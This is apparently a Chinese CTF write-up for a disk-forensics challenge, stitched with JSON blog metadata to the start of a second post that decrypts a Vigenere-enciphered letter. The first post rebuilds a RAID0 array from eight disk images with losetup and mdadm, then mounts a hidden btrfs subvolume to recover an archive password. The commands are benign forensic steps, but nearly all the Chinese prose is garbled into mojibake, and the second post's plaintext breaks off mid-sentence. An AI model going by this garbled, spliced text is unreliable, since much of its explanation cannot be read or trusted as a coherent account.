åå¼€å§‹å‡ºç°äº†æ˜æ˜¾çš„æ•°æ®æˆªæ–­ã€‚\næ‰€ä»¥å¯ä»¥æ¨å¾—å—å¤§å°æ˜¯ 0x2c0000 - 0x200000 = 786432 B = 768 KBã€‚\nï¼ˆå…¶å®æ¢å¤çš„ç£ç›˜åˆ†å—å¤§å°ä¸º 256 æ‰‡åŒºã€128KBå¤§å°ï¼Œè¯¥æ–¹æ³•å¯èƒ½ä¼šç¨å¾®æ”¾å¤§ä¸€äº›ï¼Œä½†æ˜¯åœ¨å®æˆ˜ä¸­è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œåªæ˜¯åé¢æ‹¼å›¾çš„æ—¶å€™ä¸å¤ªå¥½çœ‹å‡ºæ¥ï¼‰\nä½†æ˜¯,å½“æˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•æ¥è®¡ç®—å…¶ä»–ç¡¬ç›˜æ–‡ä»¶çš„å—å¤§å°çš„æ—¶å€™ï¼Œä¼šå‘ç°ä¸åŒæ–‡ä»¶çš„å—å¤§å°å¹¶ä¸å®Œå…¨ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ä»–ä»¬çš„è¾ƒå¤§å…¬çº¦æ•° 128 KB æ¥ä½œä¸ºä»–ä»¬çš„å—å¤§å°ã€‚\n3.Pythonä»£ç æ±‚ç£ç›˜é¡ºåº # ä¸‹ä¸€æ­¥æˆ‘ä»¬éœ€è¦çŸ¥é“ç›˜çš„é¡ºåºã€‚è™½ç„¶å¯ä»¥æ‰¾åˆšå¥½è¢«æˆªæ–­çš„æ–‡ä»¶ä¸€ä¸ªä¸ªæ¨é¡ºåºï¼Œ~~ä½†æ˜¯ç›´æ¥åœ¨taokyå¸ˆå‚…çš„ä»£ç ä¸Šæ”¹ä¸€æ”¹å°±ç”¨ä¸æ˜¯æ›´ç®€å•å—ï¼Ÿ~~ä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥å€Ÿè¿™ä¸ªæœºä¼šå­¦ä¹ ä¸€ä¸‹ä¼˜ç§€å¸ˆå‚…çš„Pythonä»£ç ï¼Œä¹Ÿå­¦ä¹ ä¸€ä¸‹Pythonçš„ matplotlib åº“ï¼š\nimport numpy as np import matplotlib.pyplot as plt files = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] # ç¬¬ä¸€å—å’Œæœ€åä¸€å—ç›˜æ˜¯å·²çŸ¥çš„ \u0026#39;\u0026#39;\u0026#39; æ‹¼å›¾æ¸¸æˆçš„ç©æ³•ï¼š é¼ æ ‡æ‹–åŠ¨ä¸Šé¢8ä¸ªæ–‡ä»¶çš„å­—ç¬¦ä¸²ï¼Œæ”¹å˜ä»–ä»¬çš„é¡ºåºåè¿è¡Œä»£ç ï¼Œæ¯”å¯¹ç”Ÿæˆçš„å›¾ç‰‡ï¼Œæ‰¾å‡ºæ­£ç¡®çš„ç£ç›˜é¡ºåº \u0026#39;\u0026#39;\u0026#39; my_block = 128 # æˆ‘ä»¬çš„å—çš„å¤§å°,å¯ä»¥å–128,256,512ç­‰ç­‰,å¤šå–å‡ æ¬¡æ¥åˆ¤æ–­ start = 0 # ä»å¤´å¼€å§‹è¯»å– sz = 16 * 1024 * 1024 # è¯»å–çš„æ–‡ä»¶å¤§å° (bytes) n = my_block * 1024 # å—å¤§å° b = 1024 # ç”¨äºæ±‚å’Œçš„å°å—å¤§å° data = [] for fn in files: with open(\u0026#34;./\u0026#34; + fn, \u0026#39;rb\u0026#39;) as f: f.seek(start, 0) data.append(np.frombuffer(f.read(sz), dtype=np.uint8)) p = [[np.sum(data[f][i * n + j * b: i * n + j * b + b]) for f in range(len(files)) for j in range(n // b)] for i in range(sz // n)] # i: å—, j: å°å—, f: æ–‡ä»¶ graph = np.array(p) print(graph.shape) plt.matshow(graph, aspect=\u0026#39;auto\u0026#39;) plt.xticks(np.arange(0, my_block*8+0.1, step=my_block)) plt.yticks(np.arange(0, 128.1, step=16)) plt.show() æœ€åå¾—åˆ°çš„æ­£ç¡®é¡ºåºæ˜¯ï¼š\nfiles = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] äºŒ ç»„è£…ç£ç›˜æ–‡ä»¶ # ä¸‹ä¸€æ­¥ï¼šæŒ‰æˆ‘ä»¬æ±‚å‡ºé¡ºåºæŒ‚è½½åˆ†åŒºï¼ˆæŒ‚è½½çš„æ—¶å€™å°±å¯ä»¥æ£€æµ‹æˆ‘ä»¬çš„é¡ºåºæ˜¯å¦æœ‰è¯¯äº†ï¼‰ æˆ‘ä»¬ä½¿ç”¨Linux losetup å‘½ä»¤æ¥è®¾ç½®å¾ªç¯è®¾å¤‡ï¼Œå…³äºå¾ªç¯è®¾å¤‡ï¼ˆloopï¼‰ï¼š å¾ªç¯è®¾å¤‡å¯æŠŠæ–‡ä»¶è™šæ‹ŸæˆåŒºå—è®¾å¤‡ï¼Œç±ä»¥æ¨¡æ‹Ÿæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè®©ç”¨æˆ·å¾—ä»¥å°†å…¶è§†ä¸ºç¡¬ç›˜é©±åŠ¨å™¨ï¼Œå…‰é©±æˆ–è½¯é©±ç­‰è®¾å¤‡ï¼Œå¹¶æŒ‚å…¥å½“ä½œç›®å½•æ¥ä½¿ç”¨ã€‚\n//å…ˆçœ‹çœ‹æˆ‘ä»¬å¯ç”¨çš„loopï¼Œä¸€èˆ¬åªä¼šæ˜¾ç¤ºä¸€ä¸ªè®¾å¤‡ï¼Œ //æ¯æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨ä¸€æ¬¡æŸ¥çœ‹ä¸‹ä¸€ä¸ªå¯ç”¨loop,ä¸è¿‡ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯æŒ‰é¡ºåºçš„ï¼Œç›´æ¥æŒ‚è½½ä¹Ÿå¯ä»¥ã€‚ sudo losetup -f //ç„¶åæŒ‰é¡ºåºæŒ‚è½½ï¼Œtaokyå¸ˆå‚…é‡‡ç”¨çš„æ˜¯åªè¯»æŒ‚è½½ï¼Œé¿å…æœ‰é”™è¯¯çš„å†™å…¥ï¼š sudo losetup --read-only /dev/loop0 UkAQZEahRpFP.img sudo losetup --read-only /dev/loop1 G6i0ErEQwiFm.img sudo losetup --read-only /dev/loop2 NKGGtuKv6Qr4.img sudo losetup --read-only /dev/loop3 O53ORjQLbNjg.img sudo losetup --read-only /dev/loop4 q8snWXN5Ltwx.img sudo losetup --read-only /dev/loop5 Y1et5EJL2XGX.img sudo losetup --read-only /dev/loop6 BpStXfb7DgbO.img sudo losetup --read-only /dev/loop7 KESNic6iRwY3.img //ä¸è¿‡æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨çš„æ˜¯ç›´æ¥æŒ‚è½½ï¼Œ //å› ä¸ºåé¢ä¼šå‡ºç°éœ€è¦è¯»å†™æƒé™çš„æ“ä½œï¼Œå¦‚æœé‡‡ç”¨åªè¯»å°±è¦å›æ¥å†èµ°ä¸€éäº†ï¼ˆå¿ƒç´¯ï¼‰ sudo losetup /dev/loop0 UkAQZEahRpFP.img sudo losetup /dev/loop1 G6i0ErEQwiFm.img sudo losetup /dev/loop2 NKGGtuKv6Qr4.img sudo losetup /dev/loop3 O53ORjQLbNjg.img sudo losetup /dev/loop4 q8snWXN5Ltwx.img sudo losetup /dev/loop5 Y1et5EJL2XGX.img sudo losetup /dev/loop6 BpStXfb7DgbO.img sudo losetup /dev/loop7 KESNic6iRwY3.img //ä½¿ç”¨mdadmæ¥ç»„è£… sudo apt install mdadm sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0,1,2,3,4,5,6,7} //å¦‚æœloopæ˜¯è¿ç»­çš„å¯ä»¥ç®€å†™ä¸ºï¼š sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0..7} è¾“å‡ºï¼šmdadm: array /dev/md0 built and started. //æŒ‚è½½æˆ‘ä»¬çš„/dev/md0 mkdir mountpoint sudo mount -o ro /dev/md0p1 mountpoint/ cd mountpoint //æ¿€åŠ¨äººå¿ƒçš„æ—¶åˆ»åˆ°äº†ï¼ï¼ï¼ //ls æŸ¥çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶ cat è¯»æ–‡ä»¶ ls cat note.txt è¾“å‡ºå¦‚ä¸‹å›¾ï¼š å¥½äº†ï¼Œäººå·²ç»æœ‰ç‚¹æ‡µäº†ï¼Œæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„flag.7zåœ¨å“ªé‡Œï¼Ÿéš¾é“æ˜¯ä»€ä¹ˆå¥‡æ€ªçš„éšå†™å–è¯å—ï¼Ÿï¼Ÿ åœ¨æ¥ä¸‹æ¥çš„ä¸€é•¿æ®µæ—¶é—´é‡Œï¼Œæˆ‘æ‹¿010editorä»”ç»†æŸ¥çœ‹äº†ä¸€ä¸‹8ä¸ªæ–‡ä»¶çš„æ•°æ®ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•å¤´ç»ªï¼Œæœ€åå®åœ¨æ²¡æ€è·¯äº†å’ŒGZå­¦é•¿è”ç³»äº†ä¸€ä¸‹ï¼Œé¢˜ç›®è¡¥å……äº†ä¸€ä¸ªé‡è¦çš„hintï¼šç£ç›˜ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹æ˜¯ btrfs åæ¥æ‰å‘ç°åŸæ¥ubuntuä¹Ÿå·²ç»å‘Šè¯‰æˆ‘äº†ï¼Œä¸è¿‡å½“æ—¶ä¸äº†è§£btrfsæ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿæ²¡æœ‰å¾€è¿™æ–¹é¢å¤šæƒ³ åå­—ä¸‹é¢å°±å‘Šè¯‰æˆ‘ä»¬æ˜¯btrfsæ–‡ä»¶ç³»ç»Ÿäº†/æ‚²/ ä¸‰ æŒ‚è½½éšè—å·ï¼Œå–å¾—flag # æ–¹æ³•ä¸€ï¼šç›´æ¥åœ¨Ubuntuæˆ–kaliç­‰è™šæ‹Ÿæœºæ„å»ºbtrfsæ–‡ä»¶ç³»ç»Ÿ # æ¥ä¸‹æ¥å°±æ˜¯ä¸€è¿ä¸²çš„æ„å»ºbtrfsæ–‡ä»¶æ“ä½œç³»ç»Ÿå’Œé‡æ–°å¼€å§‹æŒ‚è½½ç£ç›˜ä¹‹è·¯äº†ï¼š ï¼ˆèµ¶æ—¶é—´çš„åŒå­¦å¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºåé¢æœ‰æ›´åŠ ç®€å•çš„æ–¹æ³•ï¼‰\nsudo apt install btrfs-progs //è£…å°±å®Œäº† sudo df -ha //çœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿç£ç›˜ä½¿ç”¨æƒ…å†µ fallocate -l 512M /tmp/btrfs.img mkfs.btrfs /tmp/btrfs.img sudo mkdir /mnt/btrfs sudo mount /tmp/btrfs.img /mnt/btrfs sudo chmod 777 /mnt/btrfs sudo mkdir my_btrfs sudo mount /tmp/btrfs.img my_btrfs sudo mount /dev/md0p1 my_btrfs /mnt/sysimage df my_btrfs //åˆ¤æ–­æ˜¯å¦æ˜¯btrfsæ–‡ä»¶ç³»ç»Ÿ cd my_btrfs sudo mkdir mountpoint //éœ€è¦è¯»å†™æƒé™ btrfs filesystem df mountpoint sudo mount -o ro /dev/md0p1 mountpoint ls cat note* è¾“å‡ºçš„ç»“æœè¿˜æ˜¯ä¸€æ ·çš„ï¼Œ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦å¥½å¥½æƒ³æƒ³è¿˜æœ‰å“ªé‡Œå¯ä»¥è—flagæ–‡ä»¶äº†ã€‚ é‡ç‚¹åœ¨btrfsæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æ®Šä¹‹å¤„ï¼šBtrfsæ–‡ä»¶ç³»ç»Ÿæœ‰subvolumeä¸snapshotåŠŸèƒ½ï¼ŒåŠå¯ä»¥åˆ›å»ºå­å·ä¸å¿«ç…§ã€‚ æŸ¥çœ‹å­å·çš„å‘½ä»¤ï¼š\nsudo apt install btrfs-progs //åœ¨mountpointç›®å½•æŸ¥çœ‹å­å· btrfs subvol list ./ btrfs subvol list è¿™ä¸ªå‘½ä»¤éå¸¸å…³é”®ï¼Œä»–èƒ½è®©æˆ‘ä»¬å‘ç°åŸæ¥åœ¨è¿™ä¸ªç£ç›˜ä¸‹æœ‰ç€éšè—ç€çš„å­å·ï¼Œçœ‹åˆ°ä»–ä»¬çš„åå­—æˆ‘ä»¬å°±çŸ¥é“äº†ï¼š @data ä¸ @secretï¼Œflag åº”è¯¥å°±åœ¨ @secreté‡Œé¢äº†ã€‚ æ­è½½å­å·çš„å‘½ä»¤ï¼š\n//å°†æŒ‚è½½å·çš„IDæ”¹ä¸º@secretçš„ID sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //é‡æ–°æŒ‚è½½ cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //å°†æŒ‚è½½å·çš„IDæ”¹ä¸º@dataçš„ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls ä¸è¿‡ï¼Œåœ¨è¿™ä¸€æ•´ä¸ªè¿‡ç¨‹ï¼Œéå¸¸å®¹æ˜“å‡ºç°ä»¥ä¸‹è¿™è¡Œå­—(ä¹Ÿæœ‰å¯èƒ½æ˜¯è‹±æ–‡ç‰ˆçš„)ï¼š\nmount: /mnt/mountpoint: æ–‡ä»¶ç³»ç»Ÿç±»å‹é”™è¯¯ã€é€‰é¡¹é”™è¯¯ã€/dev/md0p1 ä¸Šæœ‰åè¶…çº§å—ã€ç¼ºå°‘ä»£ç é¡µæˆ–å¸®åŠ©ç¨‹åºæˆ–å…¶ä»–é”™è¯¯. dmesg(1) may have more information after failed mount system call. å¯èƒ½æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨å»ºç«‹btrfsæ–‡ä»¶ç³»ç»Ÿæ—¶æœ‰ä¸€äº›å°é”™è¯¯ï¼Œæˆ–æ˜¯å¤šæ¬¡æŒ‚è½½å¯¼è‡´ç¡¬ç›˜æ–‡ä»¶æœ‰äº†æŸåã€‚ è¿™é‡Œå¯ä»¥é€‰æ‹©æ‰§è¡Œå‘½ä»¤æ¥æŸ¥çœ‹é—®é¢˜å¹¶ä¿®å¤ï¼Œä¸è¿‡æœ‰ç‚¹å¤æ‚ã€‚\nsudo dmesg æ‰€ä»¥ï¼Œæˆ‘åœ¨å¤šæ¬¡å°è¯•å¤±è´¥åé‡‡ç”¨äº†å¦ä¸€ç§æ–¹æ³•â€”â€”ç›´æ¥ä¸‹è½½å¸¦æœ‰btrfsæ–‡ä»¶ç³»ç»Ÿçš„linuxç³»ç»Ÿï¼Œä¸ubuntué½åçš„Fedoraï¼š https://getfedora.org/zh_Hans_CN/ åé¢çš„æ•´ä¸ªæ“ä½œå°±ä¸€è·¯ç»¿ç¯å•¦ï¼\næ–¹æ³•äºŒï¼šå®‰è£…Fedoraï¼Œç›´æ¥æŒ‚è½½éšè—å· # ç¬¬äºŒã€ç¬¬ä¸‰éƒ¨åˆ†å…¨éƒ¨å‘½ä»¤ï¼ˆFedoraè™šæ‹Ÿæœºä¸‹ï¼‰ # //ç¬¬ä¸€æ­¥ï¼šè¿æ¥å…±äº«æ–‡ä»¶å¤¹ï¼Œå°†8ä¸ªç£ç›˜æ–‡ä»¶ç»„è£…èµ·æ¥ï¼š vmware-hgfsclient sudo mkdir -p /mnt/hgfs sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs_fuse,allow_other cd /mnt/hgfs cd share ls sudo losetup -f //è¾“å‡ºï¼š/dev/loop3 sudo losetup /dev/loop3 UkAQZEahRpFP.img sudo losetup /dev/loop4 G6i0ErEQwiFm.img sudo losetup /dev/loop5 NKGGtuKv6Qr4.img sudo losetup /dev/loop6 O53ORjQLbNjg.img sudo losetup /dev/loop7 q8snWXN5Ltwx.img sudo losetup /dev/loop8 Y1et5EJL2XGX.img sudo losetup /dev/loop9 BpStXfb7DgbO.img sudo losetup /dev/loop10 KESNic6iRwY3.img sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /mnt/md0 /dev/loop{3,4,5,6,7,8,9,10} //è¾“å‡ºï¼šmdadm: array /dev/md0 built and started. //------------------------------------------------------// //ç¬¬äºŒæ­¥ï¼šåœ¨btrfsæ–‡ä»¶ç³»ç»Ÿä¸‹æŒ‚è½½ç£ç›˜ sudo blkid //æŸ¥çœ‹btrfsæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½• //éƒ¨åˆ†è¾“å‡ºï¼š/dev/nvme0n1p3: LABEL=\u0026#34;fedora_localhost-live\u0026#34; UUID=\u0026#34;ddb495f5-ddf3-4dfc-bd6f-9ea32304a4ab\u0026#34; UUID_SUB=\u0026#34;c7d187e8-96d6-4301-a1a0-0ee1b5adb011\u0026#34; BLOCK_SIZE=\u0026#34;4096\u0026#34; TYPE=\u0026#34;btrfs\u0026#34; PARTUUID=\u0026#34;a5b72680-20da-4446-9e5b-e35eacb881dc\u0026#34; sudo df -ha //æŸ¥çœ‹/dev/nvme0n1p3æŒ‚è½½çš„ç›®å½• //éƒ¨åˆ†è¾“å‡ºï¼š/dev/nvme0n1p3 19G 2.9G 16G 16% /mnt/sysimage cd /mnt/sysimage sudo mkdir mountpoint sudo mount /dev/md0p1 mo* cd mo* ls -a //-a æŸ¥çœ‹æ˜¯å¦æœ‰éšè—æ–‡ä»¶ //è¾“å‡ºï¼š. .. note.txt cat note* /*è¾“å‡ºï¼šWow, you found me! But it doesn\u0026#39;t look like there\u0026#39;s anything here...*/ //----------------------------------------------------// //ç¬¬ä¸‰æ­¥ï¼šæŒ‚è½½éšè—å·ï¼Œæ‰§è¡Œè„šæœ¬è·å¾—å¯†ç ï¼Œè§£å¼€å‹ç¼©åŒ…å¾—flag sudo btrfs subvolume list ./ /* è¾“å‡ºï¼š ID 256 gen 12 top level 5 path @ ID 257 gen 10 top level 5 path @data ID 258 gen 10 top level 5 path @secret */ sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //å°†æŒ‚è½½å·çš„IDæ”¹ä¸º@secretçš„ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //è¾“å‡ºï¼šflag.7z cp flag.7z /mnt/hgfs/share //å¤åˆ¶åˆ°æˆ‘ä»¬çš„çœŸæœºé‡Œ //æ‰“å¼€æç¤ºéœ€è¦å¯†ç ï¼Œè¾“å…¥åé¢ä»£ç æ‰§è¡Œå¾—åˆ°çš„å¯†ç å°±å¯ä»¥å¾—åˆ°flagå•¦ sudo btrfs subvolume set-default 257 /mnt/sysimage/mountpoint //å°†æŒ‚è½½å·çš„IDæ”¹ä¸º@dataçš„ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls //è¾“å‡ºï¼š //calc.py data cp calc.py /mnt/hgfs/share //å¤åˆ¶åˆ°æˆ‘ä»¬çš„çœŸæœºé‡Œ,æ–¹ä¾¿è§£è¯»ä»£ç ï¼Œä¹Ÿå¯ä»¥è¯•ç€è·‘ä¸€è·‘ï¼Œå‘ç°è¦åœ¨åŸæ–‡ä»¶å¤¹æ‰§è¡Œï¼Œç„¶åå°±ä¼šè¾“å‡ºflag.7zçš„å¯†ç  python3 calc.py //è¾“å‡ºï¼šWell done! The password for flag.7z is [/*ä¸€ä¸²è¶…çº§é•¿çš„æ•°å­—*/] åšé¢˜æ—¶çš„æˆªå›¾ï¼šï¼ˆä¸å¾—ä¸è¯´Fedoraè¿˜æ˜¯æŒºå¥½çœ‹çš„ï¼‰ calc.pyçš„ä»£ç ï¼š\n# Use this script to calculate the hash of the ./data folder # The result can be used to excrypt the flag.7z file import hashlib import os def hashfile(hasher_func, path, blocksize = 65536): afile = open(path, \u0026#39;rb\u0026#39;) hasher = hasher_func() buf = afile.read(blocksize) while len(buf) \u0026gt; 0: hasher.update(buf) buf = afile.read(blocksize) afile.close() return hasher.hexdigest().encode() def hashdir(hasher_func, path, blocksize = 65536): hasher = hasher_func() for root, dirs, files in os.walk(path): for name in files: print(os.path.join(root, name)) hasher.update(os.path.join(root, name).encode()) hasher.update(hashfile(hasher_func, os.path.join(root, name), blocksize)) for _dir in dirs: hasher.update(hashdir(hasher_func, os.path.join(root, _dir), blocksize)) return hasher.hexdigest().encode() if __name__ == \u0026#39;__main__\u0026#39;: pre_hash = hashdir(hashlib.md5, \u0026#39;./data\u0026#39;) if pre_hash != b\u0026#39;da206f2407171ed2ea0779a1e93af014\u0026#39;: print(\u0026#39;Something is wrong, please check your volume!\u0026#39;) exit(1) hash_pwd = hashdir(hashlib.sha256, \u0026#39;./data\u0026#39;) print(f\u0026#34;Well done! The password for flag.7z is [{hash_pwd.decode()}]\u0026#34;) the end # å®Œæˆè¿™é“é¢˜å‰å‰ååå¤§æ¦‚è·¨è¶Šäº†ä¸‰å¤©ï¼Œç¬¬ä¸€æ­¥åˆ¤æ–­ç£ç›˜é¡ºåºå…¨é æœ‰å¸ˆå‚…ä»¬çš„é¢˜è§£ï¼Œå¼•é¢†æˆ‘ä»é›¶å¼€å§‹å­¦ä¹ RAIDç›¸å…³çŸ¥è¯†ï¼Œç¬¬äºŒæ­¥ä¸ç¬¬ä¸‰æ­¥ç€å®è®©æˆ‘è®¤è®¤çœŸçœŸåœ°ç†Ÿæ‚‰äº†ä¸€élinuxç³»ç»Ÿçš„å„ç§æ“ä½œï¼Œè¿˜å­¦ä¹ äº†ä¸€ä¸‹btrfsçš„ç›¸å…³çŸ¥è¯†ï¼ˆå…¶å®åœ¨ç¬¬ä¸‰æ­¥çš„æ–¹æ³•ä¸€ä¸­ä¸ºäº†è§£å†³æŠ¥é”™éƒ½æŠŠbtrfsçš„å®˜æ–¹æ–‡ä»¶çœ‹äº†å¥½å‡ éäº† ğŸ˜‡ ï¼‰\nä¸€é“é¢˜å®Œæ•´åœ°è§£å†³å†è®¤çœŸåœ°å†™ä¸€ä¸‹wpï¼Œå®å®åœ¨åœ¨åœ°å­¦åˆ°äº†è®¸å¤šä¸œè¥¿ã€‚åœ¨æ¬¡ï¼Œä¹Ÿè®©æˆ‘å¯¹æˆ‘åœ¨ctfè·¯ä¸Šæœ€å¥½çš„æœ‹å‹â€”â€”æœç´¢å¼•æ“ è¡¨è¾¾ä¸€ä¸‹æˆ‘æ·±æ·±çš„æ„Ÿè°¢ï¼ è¿˜æœ‰ä¸€ä¸ªå°å½©è›‹ï¼Œæˆ‘åœ¨åšé¢˜æ—¶å‚è€ƒäº†ä¸€ä¸‹GZå­¦é•¿çš„wpï¼š https://blog.gztime.cc/posts/2021/b76fbea6/#%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88 ä»¥åä¸€å®š~~ï¼ˆç¿»ä¸€ç¿»)~~å¥½å¥½è¯»ä¸€è¯»å­¦é•¿çš„blogã€‚\næœ€åï¼š æ„Ÿè°¢æ‚¨çš„é˜…è¯»ï¼è¿™æ˜¯æˆ‘åœ¨ctfè·¯ä¸Šå†™çš„ç¬¬ä¸€ä»½å®Œæ•´wpï¼Œæœ‰ä»»ä½•ä¸è¶³ä¹‹å¤„è¿˜è¯·æ‰¹è¯„æŒ‡æ­£ï¼ ç¦»å¼€å‰å†å¤ä¹ ä¸€ä¸‹è¿™ä¸€ç¯‡wpçš„ä¸»è¦å†…å®¹å§ ! see you next time ! ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/11_w4ter-disk_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-W4ter Disk"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rå…ˆåœ¨æµè§ˆå™¨ä¸Šè®¿é—®å®ä¾‹ï¼Œå¯ä»¥å¾—åˆ°å¯†æ–‡ï¼š\nOkze WEYng,\nD eixy jgty lrmdtpt afhlm onf cdyf lgm icxn gik\u0026rsquo;qp kmwijbwv oey mrsheklrhe ho ROC wpubkptfrm. Ll hdp hhwq, sqjvsbactywt fm i whtnozy wzfydibhb iv lltx PNQ vqpgiyvaur, ltc vn\u0026rsquo;d bvejonihj sz nziy l zxdy rhlyhregmqcyz xu oey lcvepxdan pglgtmnqid spigacbnnh oeub uhd fydq.\nCy vupnpck whxazntlliqn, oey Dcwdykqr uyw Lpzpuz wyoskqf ucx ydkrfil sgzobrm. Ean Kddyvyhd noouyc bb p klfgubosgarntv bjwpnqnkstum pcaang oeub oidd g qrjptcxid emsmncj sb yyvrecbl xfqhyzdkn xxbhvdya. Cj\u0026rsquo;r l vnjycyda zkwzsfstum gize, kjo fn kud ap iqnwvxm jnfho zhdbadawj twpgvmqm. Jgp Izrmlk lxkeyz ci z dolcfpk bjwpnqnkstum pcaang oeub mxhqzr runa utoqyz cd ssk oyutgctsq vg u vhikc aoxung jc jwmystumf xzpw icb utjxzmks. Zioxac xosxnefcgous zyotmp gwlu zobzawpw ncxosxnyny zdpbybzjzp mcwx zd zgr Uoojcxbx Mhsqjvsviy Lcpiauzx (QDD). GDF cd t bnhjyblyb ptbesamrdi xfoihhenl gblm dhzp u syo sz kmpljic pia xmwhxaz cnnl. Bc\u0026rsquo;h ybmqaddo zn eydbbi vqniwar qxnz ygxw icb gwmj zobzawpw ldhmobyhr ltc vm hbmtgv oayt sz kmpljic hzkmqnyup jzgu. Llhbhbnzcs dyiqljebxc dp uvijgpx hzjzkcpiq yvwhxazhbh exlwifkcy jglz\u0026rsquo;r hmpw rc XQZ kbqkwkmtyd. Tbnhjyblyb ptbesamrdi rmmm jvz qdlm, l idqgfw syo zyj z cltojiz hyg, ne dyiqlje tws ybwzsfs ogsn. Ce\u0026rsquo;l ldhjivfo tdkc vh obpxoxf acwmlzteyd tws nbwclu bzslhhtvjidlh xleszinym.\nTg ldizfcmyny, iqljehpgvmbg ci z qgrpcytcxid uvx sglrkrhrbwv nrvryss enzg\u0026rsquo;m nkridzut ne BEL buuwencbbm. Ebusskq lif\u0026rsquo;kn czt nw WJE zx za yiingdbhkyt BELde, oywngnquvxymr zgr xtyotmbhb ydbceogczg ctxehqkkdd or rmdxwidxf bi itnidrx tg cwzpy kbqkwkmtyd. Dntk brxfeqttf nho ajkz cov whznqhaa eaxhz zcxbuqd!\nEnhl qejv dp Q4byhBEL ncyy uapxb ovLQU31 ftcrlwbwt Oe3 ovxuqwomr mPvaT7 pkxmlbhyk 8TECpW dcybltcdd 1Y amqycercz 1oyyO3DbJ ikbmp uapxb.\nVmmj qpmzexd, Wa. 0e\nå¯ä»¥çœ‹å‡ºæ¥å¯†æ–‡åº”è¯¥æ˜¯ç”¨ç»´å‰å°¼äºšå¯†ç æ¥åŠ å¯†çš„ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™è„šæœ¬æ¥è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ï¼Œ pythonè„šæœ¬å‚è€ƒï¼š https://cloud.tencent.com/developer/article/1076719 åœ¨çº¿ç½‘ç«™ï¼š https://www.guballa.de/vigenere-solver è§£ç ä¹‹åå¾—åˆ°åŸæ–‡ï¼š\nDear CTFer,\nI hope this message finds you well and that you're enjoying the excitement of CTF challenges. As you know, cryptography is a crucial component of many CTF challenges, and it's important to have a good understanding of the different encryption techniques that are used. In classic cryptography, the Vigenere and Caesar ciphers are popular choices. The Vigenere cipher is a polyalphabetic substitution cipher that uses a repeating keyword to encipher plaintext messages. It's a powerful encryption tool, but it can be cracked using frequency analysis. The Caesar cipher is a simpler substitution cipher that shifts each letter in the plaintext by a fixed number of positions down the alphabet. Modern cryptography offers more advanced encryption techniques such as the Advanced Encryption Standard (AES). AES is a symmetric encryption algorithm that uses a key to encrypt and decrypt data. It's designed to resist attacks from even the most advanced computers and is widely used to encrypt sensitive data. Asymmetric encryption is another important encryption technique that's used in CTF challenges. Asymmetric encryption uses two keys, a public 